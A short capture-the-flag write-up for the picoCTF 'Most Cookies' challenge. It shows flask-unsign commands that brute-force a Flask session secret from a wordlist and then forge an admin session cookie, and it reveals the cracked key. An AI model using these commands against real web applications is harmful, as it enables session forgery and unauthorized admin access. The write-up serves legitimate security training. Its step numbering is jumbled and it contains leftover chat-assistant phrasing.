[Most Cookies](https://play.picoctf.org/practice/challenge/177)

## problem statement
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!
Additional details will be available after launching your challenge instance.

## Hint
1. How secure is a flask cookie?


## Solution
1. Install the Cracking Tool
On Kali Linux, you need a tool that can read and "re-sign" Flask cookies.
<br><br>

`pip3 install flask-unsign[wordlist] --break-system-packages`

3. Create the "Guessing" Wordlist
 
This is the most important setup step. The server's "secret key" is one of 28 specific cookie names. You use the cat command to create a dictionary file that the tool will use to guess the password.
<br><br>

so you need to run a nano script which here it is if you need it [script.py](script.py)

5. Find the Secret Key (Brute-Force)
Now, you give the tool your current cookie (from your browser) and the list of words you just made. It will test every word until it finds a match.
Run this command:
(Note: I’ve used the cookie string from the image you provided)
bash

flask-unsign --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.afJ_ow.kwC0cfqBSOOfe0efTFzRxajdXbg' --wordlist wordlist.txt
Use code with caution.
The result: It will tell you the key is pinwheel.

5. Forge the Admin Cookie
Now that you have the secret key (pinwheel), you can "sign" your own cookie and the server will believe it is real.
Run this command:
bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'pinwheel'
Use code with caution.
The result: The terminal will give you a new long string. Copy it!


